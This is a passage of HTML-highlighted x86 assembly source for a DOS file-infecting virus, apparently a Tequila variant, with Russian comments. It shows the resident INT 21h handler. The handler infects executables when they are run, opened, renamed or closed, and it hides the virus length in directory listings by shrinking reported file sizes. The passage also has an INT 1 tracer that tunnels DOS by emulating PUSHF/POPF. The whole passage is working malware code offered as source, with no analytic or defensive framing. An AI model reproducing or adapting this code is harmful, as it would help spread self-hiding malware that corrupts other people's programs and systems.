        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">OldVersion</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Generation</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; Обновляем поколение</span><span class="sc0">
</span><span class="sc5">OldVersion</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">AnswerID</span><span class="sc0">         </span><span class="sc1">; Ответ</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────</span><span class="sc0">
</span><span class="sc5">TeqIdentify</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">TeqJazInfo</span><span class="sc0">   </span><span class="sc1">; Выдача информации ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">OtherTJ</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TequilaInfo</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DOS</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">ExitOurFunc</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">OtherTJ</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">TeqJazDemo</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitTeqInt21</span><span class="sc0">    </span><span class="sc1">; Не наша функция</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TequilaDemo</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DemoInfo</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DOS</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">; Маскировка по 4Eh,4Fh</span><span class="sc0">
</span><span class="sc5">Farther</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">StealthNext</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Further</span><span class="sc0">     </span><span class="sc1">; Дальше,дальше...</span><span class="sc0">

</span><span class="sc5">StealthInfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StealthPath</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyPath</span><span class="sc0">    </span><span class="sc1">; Скопируем путь если ищут файл</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">StealthNext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Флаги !</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DOS</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">FileNotFound</span><span class="sc0">    </span><span class="sc1">; Файлов не нашли</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">        </span><span class="sc1">; ES:BX - DTA</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DOS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">00011100b</span><span class="sc0">
                      </span><span class="sc1">; Если ищут метку тома или каталог</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GetOut</span><span class="sc0">        </span><span class="sc1">; или системный то на выход</span><span class="sc0">

        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Адрес имени файла</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AddFileName</span><span class="sc0">   </span><span class="sc1">; Присоединим к пути найденный файл</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestPath</span><span class="sc0">      </span><span class="sc1">; EXE,OVL,OVR</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GetOut</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FileName</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StealthPath</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FileName</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestFile</span><span class="sc0">    </span><span class="sc1">; Проверим</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GetOut</span><span class="sc0">      </span><span class="sc1">; ZF=1 - если файл уже заражен</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc5">ChkSum</span><span class="sc4">]</span><span class="sc0">
                           </span><span class="sc1">; Длинна вируса в зараженном файле</span><span class="sc0">
                           </span><span class="sc1">; (Хранится в заголовке)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Укоротим...:)</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetOut</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">FileNotFound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;────────────────────────</span><span class="sc0">
</span><span class="sc1">; Загрузка и выполнение</span><span class="sc0">
</span><span class="sc5">Further</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FileFunction</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FileFunction</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">HandlesFunc</span><span class="sc0">
</span><span class="sc5">FileFunction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestPath</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">DontFuckFile</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FileName</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FileName</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MainInfect</span><span class="sc0">
</span><span class="sc5">DontFuckFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitTeqInt21</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────</span><span class="sc0">
</span><span class="sc1">; Функции получения Handle</span><span class="sc0">
</span><span class="sc5">HandlesFunc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CreateOpen</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CreateOpen</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
</span><span class="sc5">CreateOpen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">InfHandle</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitTeqInt21</span><span class="sc0">

        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DOS</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">OpenFailure</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestPath</span><span class="sc0">       </span><span class="sc1">; Посмотрим путь</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">DontRemember</span><span class="sc0">       </span><span class="sc1">; Не запоминать Handle</span><span class="sc0">

        </span><span class="sc6">clc</span><span class="sc0">            </span><span class="sc1">; Скопируем путь</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyPath</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">InfHandle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">DontRemember</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">OpenFailure</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;────────────────────────</span><span class="sc0">
</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">        </span><span class="sc1">; Просили что то другое ...</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitTeqInt21</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Закрывают тот что открывали ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">InfHandle</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitTeqInt21</span><span class="sc0">

        </span><span class="sc6">popf</span><span class="sc0">              </span><span class="sc1">; Закроем</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DOS</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">FPBCorrupted</span><span class="sc0">      </span><span class="sc1">; НЕ закрылся</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FileName</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TeqFilePath</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FileName</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MainInfect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">InfHandle</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FPBCorrupted</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;────────────────────────</span><span class="sc0">
</span><span class="sc5">ExitTeqInt21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DOS</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">TeqJazInt21</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;───────────────────</span><span class="sc0">
</span><span class="sc5">TeqJazInt1</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; Трассирует Int 21 и эмулирует PUSHF/POPF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">KeepDS</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">KeepBX</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">KeepAX</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">KeepDX</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; DS:BX - адрес следующей команды</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Flags</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Work</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CurCMD</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">TestPrefix</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11100111b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00100110b</span><span class="sc0">        </span><span class="sc1">; ES/CS/SS/DS</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">TestCoMD</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TestPrefix</span><span class="sc0">
</span><span class="sc5">TestCoMD</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">        </span><span class="sc1">; Эмулим POP SS</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotSS</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">NotSS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Ch</span><span class="sc0">        </span><span class="sc1">; PUSHF</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ItsPushf</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Dh</span><span class="sc0">        </span><span class="sc1">; POPF</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ItsPopf</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">CurCMD</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitTeqInt1</span><span class="sc0">
</span><span class="sc5">ItsPopf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; Ставим TF в POPF</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">TrF</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GoExit1</span><span class="sc0">
</span><span class="sc5">ItsPushf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; Убираем TF в PUSHF</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Flags</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc5">TrF</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">ExitTeqInt1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Flags</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GoExit1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">KeepDS</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">KeepBX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">KeepAX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">KeepDX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;───────────────────</span><span class="sc0">
</span><span class="sc5">TestDOS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
